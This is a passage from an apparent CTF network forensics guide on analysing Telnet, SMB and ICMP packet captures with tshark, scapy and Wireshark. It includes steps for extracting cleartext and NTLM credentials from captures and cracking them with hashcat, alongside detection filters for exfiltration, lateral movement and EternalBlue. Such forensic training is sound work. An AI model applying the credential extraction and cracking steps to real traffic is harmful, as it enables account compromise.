tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | head -20 | \
while read payload; do
    echo "=== Packet ==="
    echo $payload | xxd -r -p | xxd -g 1
done

# Identify specific control sequences
python3 << 'EOF'
from scapy.all import *

# Telnet control codes
IAC = 0xFF  # Interpret As Command
WILL = 0xFB
WONT = 0xFC
DO = 0xFD
DONT = 0xFE
SB = 0xFA  # Subnegotiation Begin
SE = 0xF0  # Subnegotiation End

packets = rdpcap('capture.pcap')

control_sequence_count = 0
for pkt in packets:
    if TCP in pkt and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            if IAC in payload:
                control_sequence_count += 1
                print(f"Control sequence in packet {pkt[TCP].seq}:")
                print(f"  Hex: {payload.hex()}")
                
                # Parse command
                i = payload.index(IAC)
                if i + 1 < len(payload):
                    cmd = payload[i+1]
                    cmd_name = {
                        WILL: "WILL",
                        WONT: "WONT", 
                        DO: "DO",
                        DONT: "DONT",
                        SB: "SB",
                        SE: "SE"
                    }.get(cmd, f"0x{cmd:02x}")
                    print(f"  Command: {cmd_name}")

print(f"\nTotal control sequences: {control_sequence_count}")
EOF
```

### Telnet vs Other Cleartext Protocols

**Comparison analysis:**

```bash
#!/bin/bash
PCAP="$1"

echo "=== Cleartext Protocol Detection ==="
echo ""

# Telnet
TELNET=$(tshark -r $PCAP -Y "tcp.port == 23" | wc -l)
echo "Telnet (port 23): $TELNET packets"
if [ $TELNET -gt 0 ]; then
    echo "  [RISK] Cleartext credentials possible"
fi
echo ""

# FTP
FTP=$(tshark -r $PCAP -Y "tcp.port == 21" | wc -l)
echo "FTP (port 21): $FTP packets"
if [ $FTP -gt 0 ]; then
    echo "  [RISK] Cleartext credentials in USER/PASS commands"
    tshark -r $PCAP -Y "ftp.request.command == USER || ftp.request.command == PASS" \
    -T fields -e ftp.request.command -e ftp.request.arg | head -5
fi
echo ""

# HTTP Basic Auth
HTTP_AUTH=$(tshark -r $PCAP -Y "http.authorization" | wc -l)
echo "HTTP Basic Auth: $HTTP_AUTH packets"
if [ $HTTP_AUTH -gt 0 ]; then
    echo "  [RISK] Base64 encoded credentials"
    tshark -r $PCAP -Y "http.authorization" -T fields -e http.authorization | head -3
fi
echo ""

# SMTP
SMTP=$(tshark -r $PCAP -Y "tcp.port == 25" | wc -l)
echo "SMTP (port 25): $SMTP packets"
if [ $SMTP -gt 0 ]; then
    echo "  [RISK] Potential email content visible"
fi
echo ""

# POP3
POP3=$(tshark -r $PCAP -Y "tcp.port == 110" | wc -l)
echo "POP3 (port 110): $POP3 packets"
if [ $POP3 -gt 0 ]; then
    echo "  [RISK] USER/PASS commands in cleartext"
fi
echo ""

# IMAP
IMAP=$(tshark -r $PCAP -Y "tcp.port == 143" | wc -l)
echo "IMAP (port 143): $IMAP packets"
if [ $IMAP -gt 0 ]; then
    echo "  [RISK] LOGIN commands in cleartext"
fi
```

### Telnet Data Exfiltration Detection

[Inference] Large data transfers over Telnet may indicate data exfiltration or file transfer activities.

```bash
# Detect large Telnet sessions
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.stream -e frame.len | \
awk '{bytes[$1]+=$2} 
END {
    for(s in bytes) {
        if(bytes[s] > 100000)  # >100KB
            print "Stream", s, "transferred", bytes[s]/1024, "KB - potential exfiltration"
    }
}'

# Look for base64 encoded data streams
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -E "^[A-Za-z0-9+/]{100,}={0,2}$" | \
while read data; do
    echo "Large base64 block detected: ${#data} characters"
    echo $data | base64 -d > decoded_data.bin 2>/dev/null
    file decoded_data.bin
done

# Detect file transfer indicators
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -iE "(cat |more |less |tail )" | head -10
```

### Automated Telnet Analysis Script

```bash
#!/bin/bash
# Comprehensive Telnet traffic analysis for CTF

PCAP="$1"
OUTPUT_DIR="telnet_analysis"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 capture.pcap"
    exit 1
fi

mkdir -p $OUTPUT_DIR

echo "=== Telnet Traffic Analysis ==="
echo "Analyzing: $PCAP"
echo ""

# 1. Basic statistics
echo "[+] Extracting basic statistics..."
STREAM_COUNT=$(tshark -r $PCAP -Y "tcp.port == 23" -T fields -e tcp.stream | sort -u | wc -l)
PACKET_COUNT=$(tshark -r $PCAP -Y "tcp.port == 23" | wc -l)

echo "  Telnet streams: $STREAM_COUNT"
echo "  Total packets: $PACKET_COUNT"

# 2. Extract all streams
echo ""
echo "[+] Extracting Telnet streams..."
for stream in $(tshark -r $PCAP -Y "tcp.port == 23" -T fields -e tcp.stream | sort -u); do
    echo "  Processing stream $stream..."
    
    # Raw payload
    tshark -r $PCAP -Y "tcp.stream eq $stream" -T fields -e tcp.payload | \
    xxd -r -p > $OUTPUT_DIR/stream_${stream}_raw.bin
    
    # Readable text
    strings $OUTPUT_DIR/stream_${stream}_raw.bin > $OUTPUT_DIR/stream_${stream}_text.txt
    
    # Statistics
    SIZE=$(stat -f%z $OUTPUT_DIR/stream_${stream}_raw.bin 2>/dev/null || stat -c%s $OUTPUT_DIR/stream_${stream}_raw.bin)
    echo "    Size: $SIZE bytes"
done

# 3. Search for credentials
echo ""
echo "[+] Searching for credentials..."
grep -hir "login\|username\|password" $OUTPUT_DIR/*.txt | head -10 > $OUTPUT_DIR/credentials.txt
if [ -s $OUTPUT_DIR/credentials.txt ]; then
    echo "  Found potential credentials (see credentials.txt)"
    cat $OUTPUT_DIR/credentials.txt
else
    echo "  No obvious credentials found"
fi

# 4. Search for flags
echo ""
echo "[+] Searching for CTF flags..."
grep -hEior "(flag|ctf)\{[^}]+\}" $OUTPUT_DIR/*.txt > $OUTPUT_DIR/flags.txt
if [ -s $OUTPUT_DIR/flags.txt ]; then
    echo "  FLAGS FOUND:"
    cat $OUTPUT_DIR/flags.txt
else
    echo "  No flags in obvious format"
fi

# 5. Extract commands
echo ""
echo "[+] Extracting executed commands..."
grep -hE "^(ls|cd|cat|pwd|whoami|id|uname|ps|netstat|ifconfig)" $OUTPUT_DIR/*.txt | \
sort -u > $OUTPUT_DIR/commands.txt
if [ -s $OUTPUT_DIR/commands.txt ]; then
    echo "  Commands found:"
    head -10 $OUTPUT_DIR/commands.txt
else
    echo "  No obvious commands found"
fi

# 6. Look for encoded data
echo ""
echo "[+] Searching for encoded data..."
grep -hE "^[A-Za-z0-9+/]{40,}={0,2}$" $OUTPUT_DIR/*.txt | \
while read b64; do
    decoded=$(echo $b64 | base64 -d 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "  Base64 decoded: $decoded"
    fi
done | head -5 > $OUTPUT_DIR/decoded_data.txt

# 7. Timeline
echo ""
echo "[+] Creating timeline..."
tshark -r $PCAP -Y "tcp.port == 23" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.len | \
head -20 > $OUTPUT_DIR/timeline.txt

# 8. Generate report
cat > $OUTPUT_DIR/REPORT.txt << EOF
=== Telnet Analysis Report ===
Capture file: $PCAP
Analysis date: $(date)

SUMMARY:
- Telnet streams: $STREAM_COUNT
- Total packets: $PACKET_COUNT

FINDINGS:
- Extracted streams: See stream_*_text.txt files
- Credentials: See credentials.txt
- CTF Flags: See flags.txt
- Commands: See commands.txt
- Decoded data: See decoded_data.txt
- Timeline: See timeline.txt

SECURITY NOTES:
Telnet transmits all data in cleartext, including:
- Username and passwords
- Commands executed
- File contents
- Any other session data

RECOMMENDATION:
Review all extracted text files for sensitive information.
Pay special attention to:
1. Login sequences (usernames/passwords)
2. File contents (cat, more, less commands)
3. Base64 or hex encoded data
4. Unusual command sequences

EOF

echo ""
echo "=== Analysis Complete ==="
echo "Results saved to: $OUTPUT_DIR/"
echo "Review REPORT.txt for summary"
```

### Telnet Packet Injection Detection

[Inference] Detecting packet injection requires analyzing sequence numbers and timing patterns.

```bash
# Detect out-of-order packets (potential injection)
tshark -r capture.pcap -Y "tcp.port == 23 && tcp.analysis.out_of_order"

# Find retransmissions
tshark -r capture.pcap -Y "tcp.port == 23 && tcp.analysis.retransmission"

# Detect duplicate ACKs
tshark -r capture.pcap -Y "tcp.port == 23 && tcp.analysis.duplicate_ack"

# Sequence number analysis
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.seq -e tcp.ack -e frame.time_delta | \
awk '{
    if($3 < 0.001 && prev_seq != "" && $1 < prev_seq) {
        print "Potential injection: seq", $1, "after", prev_seq, "with delta", $3
    }
    prev_seq = $1
}'
```

### Telnet Session Comparison

```python
#!/usr/bin/env python3
"""
Compare multiple Telnet sessions to identify anomalies
"""
from scapy.all import *
from difflib import SequenceMatcher

def extract_session_text(pcap_file, stream_id):
    packets = rdpcap(pcap_file)
    text = []
    
    for pkt in packets:
        if TCP in pkt and hasattr(pkt[TCP], 'stream'):
            if pkt[TCP].stream == stream_id and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
                if Raw in pkt:
                    payload = bytes(pkt[Raw].load)
                    # Extract printable characters
                    printable = ''.join([chr(b) for b in payload if 32 <= b < 127])
                    text.append(printable)
    
    return ''.join(text)

def compare_sessions(pcap_file):
    packets = rdpcap(pcap_file)
    
    # Get all stream IDs
    streams = set()
    for pkt in packets:
        if TCP in pkt and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
            if hasattr(pkt[TCP], 'stream'):
                streams.add(pkt[TCP].stream)
    
    # Extract text from each stream
    session_texts = {}
    for stream_id in streams:
        session_texts[stream_id] = extract_session_text(pcap_file, stream_id)
    
    # Compare sessions
    print("=== Telnet Session Comparison ===\n")
    stream_list = list(streams)
    
    for i in range(len(stream_list)):
        for j in range(i + 1, len(stream_list)):
            s1 = stream_list[i]
            s2 = stream_list[j]
            
            similarity = SequenceMatcher(None, 
                                        session_texts[s1], 
                                        session_texts[s2]).ratio()
            
            print(f"Stream {s1} vs Stream {s2}:")
            print(f"  Similarity: {similarity*100:.1f}%")
            
            if similarity > 0.8:
                print("  [INFO] Sessions are very similar (possibly same user/script)")
            elif similarity < 0.3:
                print("  [INFO] Sessions are very different")
            
            print()

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 compare_telnet.py capture.pcap")
        sys.exit(1)
    
    compare_sessions(sys.argv[1])
```

### Telnet Honeypot Detection

```bash
# Identify potential honeypot characteristics
echo "=== Telnet Honeypot Indicators ==="

# 1. Check for fake banners
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -i "welcome\|banner" | head -5

# 2. Look for delayed responses (honeypots often add artificial delays)
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e frame.time_delta | \
awk '{if($1 > 2) print "Unusual delay:", $1, "seconds"}'

# 3. Check for scripted responses
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | sort | uniq -c | sort -rn | \
awk '$1 > 5 {print "Repeated response:", $0}'
```

### CTF Telnet Challenge Solver Template

```python
#!/usr/bin/env python3
"""
Template for solving Telnet-based CTF challenges from pcap
"""
from scapy.all import *
import re

def solve_telnet_ctf(pcap_file):
    packets = rdpcap(pcap_file)
    
    print("=== CTF Telnet Challenge Solver ===\n")
    
    # Strategy 1: Extract all text and search for flags
    print("[*] Strategy 1: Direct flag search...")
    all_text = []
    for pkt in packets:
        if TCP in pkt and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
            if Raw in pkt:
                payload = bytes(pkt[Raw].load)
                text = payload.decode('latin-1', errors='ignore')
                all_text.append(text)
    
    combined_text = ''.join(all_text)
    flags = re.findall(r'(flag|ctf|FLAG|CTF)\{[^}]+\}', combined_text, re.IGNORECASE)
    
    if flags:
        print(f"[+] Found {len(flags)} flag(s):")
        for flag in set(flags):
            print(f"    {flag}")
    else:
        print("[-] No obvious flags found")
    
    # Strategy 2: Look for base64 encoded data
    print("\n[*] Strategy 2: Base64 decoding...")
    b64_patterns = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', combined_text)
    
    for b64 in b64_patterns[:10]:  # Check first 10
        try:
            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
            if 'flag' in decoded.lower() or 'ctf' in decoded.lower():
                print(f"[+] Decoded: {decoded}")
        except:
            pass
    
    # Strategy 3: Look for hidden commands/outputs
    print("\n[*] Strategy 3: Command analysis...")
    commands = re.findall(r'(cat|echo|ls)\s+([^\r\n]+)', combined_text)
    
    if commands:
        print("[+] Interesting commands found:")
        for cmd, arg in commands[:10]:
            print(f"    {cmd} {arg}")
    
    # Strategy 4: Hex/octal/binary patterns
    print("\n[*] Strategy 4: Encoded patterns...")
    hex_patterns = re.findall(r'\\x[0-9a-fA-F]{2}', combined_text)
    if len(hex_patterns) > 10:
        print(f"[+] Found {len(hex_patterns)} hex escape sequences")
        hex_str = ''.join([chr(int(h[2:], 16)) for h in hex_patterns[:100]])
        print(f"    Decoded preview: {hex_str[:100]}")
    
    # Strategy 5: Steganography hints
    print("\n[*] Strategy 5: Steganography indicators...")
    stego_keywords = ['hidden', 'secret', 'encoded', 'decrypt', 'key', 'cipher']
    for keyword in stego_keywords:
        if keyword in combined_text.lower():
            context = re.findall(f'.{{0,50}}{keyword}.{{0,50}}', combined_text, re.IGNORECASE)
            if context:
                print(f"[+] Found '{keyword}' context:")
                print(f"    {context[0][:100]}")

if __name__ == '__main__':
    import sys
    import base64
    
    if len(sys.argv) < 2:
        print("Usage: python3 telnet_ctf_solver.py capture.pcap")
        sys.exit(1)
    
    solve_telnet_ctf(sys.argv[1])
```

---

**Important Related Topics:**

- Rlogin and Rsh protocol analysis (similar cleartext protocols)
- VNC traffic analysis for remote desktop credentials
- Serial console capture analysis (similar to Telnet)
- ANSI escape sequence interpretation for terminal rendering
- Telnet option negotiation exploitation techniques
- Network Time Protocol (NTP) correlation for session timing
- Cross-protocol credential reuse detection

---

## SMB/CIFS Traffic

SMB (Server Message Block) and CIFS (Common Internet File System) are network file sharing protocols primarily used in Windows environments. SMB is critical in CTF scenarios for credential extraction, lateral movement detection, and file transfer analysis.

**Protocol Versions**

- **SMB1 (CIFS)**: Legacy, insecure, deprecated (ports 139, 445)
- **SMB2**: Windows Vista/2008+ (port 445)
- **SMB2.1**: Windows 7/2008 R2
- **SMB3**: Windows 8/2012+ with encryption support
- **SMB3.1.1**: Windows 10/2016+ with enhanced security

**Default Ports**

```
TCP 139: NetBIOS Session Service (SMB over NetBIOS)
TCP 445: Direct SMB over TCP (most common)
UDP 137: NetBIOS Name Service
UDP 138: NetBIOS Datagram Service
```

### SMB Protocol Structure

**SMB Session Establishment Flow**

```
1. TCP 3-way handshake (SYN, SYN-ACK, ACK)
2. SMB Negotiate Protocol Request (client proposes SMB versions)
3. SMB Negotiate Protocol Response (server selects version)
4. SMB Session Setup Request (authentication)
5. SMB Session Setup Response (success/failure)
6. SMB Tree Connect Request (connect to share)
7. SMB Tree Connect Response
8. File operations (Create, Read, Write, Close)
9. SMB Tree Disconnect
10. SMB Logoff
```

### Wireshark Display Filters for SMB

**Basic SMB Filtering**

```
smb                           # SMB1/CIFS traffic
smb2                          # SMB2/SMB3 traffic
smb or smb2                   # All SMB versions

# Port-based filtering
tcp.port == 445
tcp.port == 139
```

**SMB Commands**

```
smb.cmd == 0x72              # SMB_COM_NEGOTIATE
smb.cmd == 0x73              # SMB_COM_SESSION_SETUP_ANDX
smb.cmd == 0x75              # SMB_COM_TREE_CONNECT_ANDX
smb.cmd == 0xa2              # SMB_COM_NT_CREATE_ANDX
smb.cmd == 0x2e              # SMB_COM_READ_ANDX
smb.cmd == 0x2f              # SMB_COM_WRITE_ANDX
smb.cmd == 0x04              # SMB_COM_CLOSE
smb.cmd == 0x71              # SMB_COM_TREE_DISCONNECT
smb.cmd == 0x74              # SMB_COM_LOGOFF_ANDX
```

**SMB2 Commands**

```
smb2.cmd == 0                # SMB2_COM_NEGOTIATE
smb2.cmd == 1                # SMB2_COM_SESSION_SETUP
smb2.cmd == 3                # SMB2_COM_TREE_CONNECT
smb2.cmd == 5                # SMB2_COM_CREATE (file open)
smb2.cmd == 6                # SMB2_COM_CLOSE
smb2.cmd == 8                # SMB2_COM_READ
smb2.cmd == 9                # SMB2_COM_WRITE
smb2.cmd == 4                # SMB2_COM_TREE_DISCONNECT
smb2.cmd == 2                # SMB2_COM_LOGOFF
```

**Authentication and Credentials**

```
# NTLM authentication
ntlmssp                       # All NTLM traffic
ntlmssp.auth                  # NTLM authentication messages
ntlmssp.messagetype == 1      # NTLM Negotiate
ntlmssp.messagetype == 2      # NTLM Challenge
ntlmssp.messagetype == 3      # NTLM Authenticate

# Username extraction
ntlmssp.auth.username         # Display username field
smb.account                   # SMB1 username

# Domain information
ntlmssp.auth.domain
smb.primary_domain

# Password hashes (when visible)
ntlmssp.auth.ntresponse       # NT hash response
ntlmssp.auth.lmresponse       # LM hash response
```

**File Operations**

```
# File access
smb2.filename                 # SMB2 filename
smb.file                      # SMB1 filename
smb2.create.action == 1       # File opened
smb2.create.action == 2       # File created
smb2.create.action == 3       # File overwritten

# File reads/writes
smb2.cmd == 8                 # Read operations
smb2.cmd == 9                 # Write operations
smb2.read_length > 0          # Non-zero reads
smb2.write_length > 0         # Non-zero writes

# Specific file patterns
smb2.filename contains ".txt"
smb2.filename contains ".exe"
smb2.filename contains "password"
smb2.filename matches "flag"
```

**Share Access**

```
# Tree connect (share mounting)
smb2.cmd == 3
smb2.tree

# Share names
smb.path contains "IPC$"      # Inter-process communication
smb.path contains "C$"        # Administrative share
smb.path contains "ADMIN$"    # Admin share
smb2.tree contains "\\\\"     # All share paths
```

**Error Conditions**

```
smb.nt_status != 0            # SMB errors
smb2.nt_status != 0           # SMB2 errors
smb2.nt_status == 0xc0000022  # Access Denied
smb2.nt_status == 0xc000006d  # Logon Failure (bad password)
smb2.nt_status == 0xc0000064  # No Such User
smb2.nt_status == 0xc0000234  # Account Locked Out
smb2.nt_status == 0xc0000193  # Account Expired
```

### CTF SMB Analysis Scenarios

**Scenario 1: Credential Extraction**

**Step 1: Identify NTLM Authentication**

```
Filter: ntlmssp
```

**Step 2: Extract NTLM Challenge/Response**

```
Filter: ntlmssp.messagetype == 2 or ntlmssp.messagetype == 3

# Locate these fields in packet details:
- NTLM Server Challenge (ntlmssp.challenge)
- NT Proof String (ntlmssp.auth.ntresponse)
- Username (ntlmssp.auth.username)
- Domain (ntlmssp.auth.domain)
```

**Step 3: Export for Cracking**

```bash
# Using tshark to extract NTLM hash
tshark -r capture.pcap -Y 'ntlmssp.auth' -T fields \
  -e ntlmssp.auth.username \
  -e ntlmssp.auth.domain \
  -e ntlmssp.identifier \
  -e ntlmssp.auth.ntresponse

# Format for hashcat (mode 5600 - NetNTLMv2)
# username::domain:server_challenge:nt_proof:blob
```

**Step 4: Crack with Hashcat**

```bash
# NetNTLMv2 format example:
# user::DOMAIN:1122334455667788:ntproofstr:blob

hashcat -m 5600 ntlm_hash.txt /usr/share/wordlists/rockyou.txt
```

**Alternative: Extract with Wireshark**

```
1. Find NTLM Authenticate packet (messagetype == 3)
2. Expand "NTLMSSP" in packet details
3. Right-click "NT Response" > Copy > Bytes > Hex Stream
4. Extract username, domain, challenge similarly
5. Format for cracking tool
```

**Scenario 2: File Transfer Analysis**

**Step 1: Identify File Operations**

```
Filter: smb2.filename
```

**Step 2: List All Files Accessed**

```bash
# Using tshark
tshark -r capture.pcap -Y 'smb2.filename' -T fields -e smb2.filename | sort -u

# In Wireshark
Statistics > Conversations > TCP tab
# Identify SMB sessions, then follow TCP stream
```

**Step 3: Extract Transferred Files**

```
Method 1: Export Objects
File > Export Objects > SMB

Method 2: Follow TCP Stream
1. Right-click SMB packet > Follow > TCP Stream
2. Show data as "Raw"
3. Save as binary file
4. Analyze extracted file
```

**Step 4: Reconstruct File from Packets**

```bash
# Export specific TCP stream
tshark -r capture.pcap -q -z follow,tcp,raw,5 > stream5.raw

# Or extract SMB file data
tshark -r capture.pcap -Y 'smb2.cmd == 9' -T fields -e smb2.write_data > file_data.bin
```

**Scenario 3: Lateral Movement Detection**

**Indicators to Monitor**

```
# Administrative share access
Filter: smb.path contains "ADMIN$" or smb.path contains "C$"

# PSExec indicators
Filter: smb2.filename contains "PSEXESVC"

# Remote service creation
Filter: smb2.filename contains ".exe" and smb.path contains "ADMIN$"

# WMI-based lateral movement
Filter: smb.path contains "ROOT\\CIMV2"

# Pass-the-hash attacks (NTLM without Kerberos)
Filter: ntlmssp and not kerberos
```

**Timeline Analysis**

```
1. Set time display: Date and Time of Day
2. Filter: ip.src == [attacker_ip] and smb2
3. Track sequence:
   - Initial authentication
   - Share enumeration
   - File writes to ADMIN$
   - Service execution
```

**Scenario 4: Data Exfiltration Detection**

**Large File Transfers**

```
Filter: smb2.cmd == 8 and smb2.read_length > 10000

# Statistics
Statistics > I/O Graph
Graph 1 filter: smb2.cmd == 8
Y Axis: SUM(smb2.read_length)
```

**Unusual File Access Patterns**

```
# Database files
Filter: smb2.filename contains ".db" or smb2.filename contains ".mdb"

# Archive files
Filter: smb2.filename contains ".zip" or smb2.filename contains ".rar" or smb2.filename contains ".7z"

# Backup files
Filter: smb2.filename contains ".bak" or smb2.filename contains "backup"
```

**After-Hours Activity**

```
# Use time display and manual review
View > Time Display Format > Time of Day
Filter: smb2
# Look for activity outside business hours
```

**Scenario 5: EternalBlue (MS17-010) Detection**

[Inference] Common indicators based on known exploit behavior:

**SMB1 Vulnerability Indicators**

```
# SMB1 protocol usage (vulnerable version)
Filter: smb

# Large buffer in Trans2 requests (exploit characteristic)
Filter: smb.cmd == 0x32 and frame.len > 4000

# NT Trans packets (used in exploit)
Filter: smb.cmd == 0xa0
```

**Suspicious Patterns**

```
# Multiple failed login attempts followed by success
Filter: smb.nt_status == 0xc000006d or smb.nt_status == 0x00000000

# Abnormal SMB packet sizes
Filter: smb and frame.len > 5000

# SMB1 to modern systems (unusual)
Filter: smb and not smb2
```

**Exploit Payload Indicators**

```
# Search for known shellcode patterns
Filter: smb and frame contains "MZ"  # PE header
Filter: smb and frame contains "This program"  # DOS stub
```

### SMB/CIFS Metadata Analysis

**Session Information**

```
# View all SMB sessions
Statistics > Conversations > TCP
Filter by port 445

# Session negotiation details
Filter: smb2.cmd == 0
Examine: smb2.dialect_count, smb2.dialect
```

**Dialect Negotiation**

```
# SMB2 Negotiate Response shows selected version
Filter: smb2.cmd == 0 and smb2.flags.response == 1

Fields to check:
- smb2.dialect: 0x0202 (SMB 2.0.2)
- smb2.dialect: 0x0210 (SMB 2.1)
- smb2.dialect: 0x0300 (SMB 3.0)
- smb2.dialect: 0x0302 (SMB 3.0.2)
- smb2.dialect: 0x0311 (SMB 3.1.1)
```

**Security Settings**

```
# Encryption status
smb2.flags.encrypted

# Signing required
smb2.flags.signature

# Session flags
smb2.session_flags
```

**File Attributes**

```
# File attributes in Create Response
smb2.file_attribute.directory
smb2.file_attribute.hidden
smb2.file_attribute.system
smb2.file_attribute.encrypted
smb2.create_timestamp
smb2.last_access_timestamp
smb2.last_write_timestamp
```

### Command-Line SMB Analysis (tshark)

**Basic Extraction**

```bash
# List all accessed files
tshark -r capture.pcap -Y 'smb2.filename' -T fields -e smb2.filename | sort -u

# List all usernames
tshark -r capture.pcap -Y 'ntlmssp.auth.username' -T fields -e ntlmssp.auth.username | sort -u

# List all shares
tshark -r capture.pcap -Y 'smb2.tree' -T fields -e smb2.tree | sort -u

# Extract NT status codes (errors)
tshark -r capture.pcap -Y 'smb2.nt_status != 0' -T fields -e frame.number -e smb2.nt_status -e smb2.filename
```

**Authentication Analysis**

```bash
# Extract NTLM authentication attempts
tshark -r capture.pcap -Y 'ntlmssp' -T fields \
  -e frame.number \
  -e ip.src \
  -e ip.dst \
  -e ntlmssp.auth.username \
  -e ntlmssp.auth.domain

# Count authentication attempts per user
tshark -r capture.pcap -Y 'ntlmssp.auth.username' -T fields -e ntlmssp.auth.username | sort | uniq -c
```

**File Operation Timeline**

```bash
# Timeline of file operations
tshark -r capture.pcap -Y 'smb2.filename' -T fields \
  -e frame.time \
  -e ip.src \
  -e smb2.cmd \
  -e smb2.filename

# Commands: 5=Create, 6=Close, 8=Read, 9=Write
```

**Statistics**

```bash
# SMB protocol hierarchy
tshark -r capture.pcap -q -z io,phs -Y smb2

# SMB command distribution
tshark -r capture.pcap -q -z smb,srt

# Top talkers on SMB
tshark -r capture.pcap -q -z conv,tcp -Y 'tcp.port==445'
```

### Advanced SMB Analysis Techniques

**Technique 1: Reconstructing Directory Listing**

```bash
# Extract all filenames with timestamps
tshark -r capture.pcap -Y 'smb2.cmd == 5' -T fields \
  -e smb2.filename \
  -e smb2.create_timestamp \
  -e smb2.file_attribute.directory | \
  awk -F'\t' '{if($3=="1") type="DIR"; else type="FILE"; print $2,$1,type}'
```

**Technique 2: Detecting Pass-the-Hash**

```
# Look for NTLM auth without prior Kerberos
Filter: ntlmssp.messagetype == 3

# Check for:
1. No corresponding Kerberos tickets in capture
2. Multiple successful authentications from same source
3. Different usernames from same source IP
```

**Technique 3: File Content Carving**

```bash
# Extract SMB write operations
tshark -r capture.pcap -Y 'smb2.cmd == 9' -T fields -e smb2.write_data | \
  while read line; do
    echo $line | xxd -r -p
  done > carved_file.bin
```

**Technique 4: Behavioral Analysis**

```bash
# Profile normal vs. anomalous SMB behavior
# Count operations per source IP
tshark -r capture.pcap -Y smb2 -T fields -e ip.src -e smb2.cmd | \
  awk '{arr[$1]++} END {for (i in arr) print arr[i], i}' | sort -rn

# High operation count might indicate automated scanning
```

### SMB Encrypted Traffic

**SMB3 Encryption Detection**

```
Filter: smb2.flags.encrypted == 1

# Encrypted sessions cannot be decrypted without session keys
# Analysis limited to metadata:
- Connection timing
- Packet sizes
- Session establishment
- Error conditions
```

[Unverified] SMB3 encryption typically requires session key material to decrypt, which is not available from passive capture alone.

### Common SMB/CIFS Port Patterns

**Port 445 Direct SMB**

```
Modern default, SMB directly over TCP
Filter: tcp.port == 445 and (smb or smb2)
```

**Port 139 NetBIOS SMB**

```
Legacy SMB over NetBIOS
Filter: tcp.port == 139 and smb
Often includes NetBIOS session service handshake
```

**NetBIOS Name Service (Port 137)**

```
Filter: udp.port == 137
Used for name resolution in older Windows networks
Contains workstation/domain names
```

## ICMP Analysis

ICMP (Internet Control Message Protocol) is a network layer protocol used for diagnostic, error reporting, and network management. In CTF scenarios, ICMP is exploited for covert channels, tunneling, reconnaissance, and DoS attacks.

**Protocol Basics**

- Layer: Network (Layer 3)
- IP Protocol Number: 1
- No port numbers (not transport layer)
- Usually not stateful (except ping request/reply matching)

### ICMP Message Types

**Common ICMP Types**

```
Type 0:  Echo Reply (ping response)
Type 3:  Destination Unreachable
Type 4:  Source Quench (deprecated)
Type 5:  Redirect
Type 8:  Echo Request (ping)
Type 9:  Router Advertisement
Type 10: Router Solicitation
Type 11: Time Exceeded (TTL expired)
Type 12: Parameter Problem
Type 13: Timestamp Request
Type 14: Timestamp Reply
Type 15: Information Request (obsolete)
Type 16: Information Reply (obsolete)
Type 17: Address Mask Request
Type 18: Address Mask Reply
Type 30: Traceroute
```

**ICMP Type 3 Codes (Destination Unreachable)**

```
Code 0:  Network Unreachable
Code 1:  Host Unreachable
Code 2:  Protocol Unreachable
Code 3:  Port Unreachable
Code 4:  Fragmentation Needed but DF Set
Code 5:  Source Route Failed
Code 6:  Destination Network Unknown
Code 7:  Destination Host Unknown
Code 9:  Network Administratively Prohibited
Code 10: Host Administratively Prohibited
Code 13: Communication Administratively Prohibited
```

**ICMP Type 11 Codes (Time Exceeded)**

```
Code 0: TTL Exceeded in Transit (traceroute)
Code 1: Fragment Reassembly Time Exceeded
```

### Wireshark Display Filters for ICMP

**Basic ICMP Filtering**

```
icmp                          # All ICMP traffic
icmpv6                        # ICMPv6 (IPv6)

# By type
icmp.type == 8                # Echo Request (ping)
icmp.type == 0                # Echo Reply
icmp.type == 3                # Destination Unreachable
icmp.type == 11               # Time Exceeded

# By code
icmp.code == 0
icmp.type == 3 and icmp.code == 3  # Port Unreachable
```

**Ping Analysis**

```
# All ping requests
icmp.type == 8

# All ping replies
icmp.type == 0

# Specific identifier (groups related pings)
icmp.ident == 0x1234

# Specific sequence number
icmp.seq == 1

# Match request/reply pairs
icmp.type == 8 or icmp.type == 0
# Then manually correlate by icmp.ident and icmp.seq
```

**ICMP Data Payload**

```
# ICMP packets with data
icmp.data

# Specific data size
data.len > 100

# Search data content
icmp.data contains "flag"
icmp.data contains "password"
frame contains "flag"  # Search entire frame
```

**Unreachable Messages**

```
# All unreachable messages
icmp.type == 3

# Port unreachable (port scanning indicator)
icmp.type == 3 and icmp.code == 3

# Host unreachable
icmp.type == 3 and icmp.code == 1

# Network unreachable
icmp.type == 3 and icmp.code == 0

# Admin prohibited
icmp.type == 3 and icmp.code == 13
```

**Time Exceeded (Traceroute)**

```
# TTL exceeded
icmp.type == 11 and icmp.code == 0

# Often combined with:
ip.ttl <= 10  # Low TTL values
```

**Redirect Messages**

```
icmp.type == 5

# Check redirect gateway
icmp.redir_gw
```

**Anomalous ICMP**

```
# Large ICMP packets (potential tunneling)
icmp and frame.len > 100

# ICMP with unusual data sizes
data.len > 64

# High frequency (potential flooding)
# Use Statistics > I/O Graph with icmp filter

# ICMP fragments (unusual)
icmp and ip.flags.mf == 1
```

### CTF ICMP Analysis Scenarios

**Scenario 1: ICMP Covert Channel / Data Exfiltration**

ICMP tunneling embeds data in ICMP packets to bypass firewall rules or exfiltrate data.

**Detection Indicators**

```
# Unusually large ICMP packets
Filter: icmp and frame.len > 100

# Non-standard data in ping payload
Filter: icmp.type == 8 and data.len > 48
# Standard Windows ping: 32 bytes
# Standard Linux ping: 48 bytes

